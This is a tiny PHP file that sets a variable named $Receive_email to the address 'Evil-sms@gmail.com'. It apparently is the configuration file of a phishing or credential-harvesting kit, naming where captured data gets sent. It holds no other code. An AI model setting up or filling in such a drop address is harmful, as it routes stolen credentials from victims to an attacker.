<?php 
$Receive_email="Evil-sms@gmail.com";

?>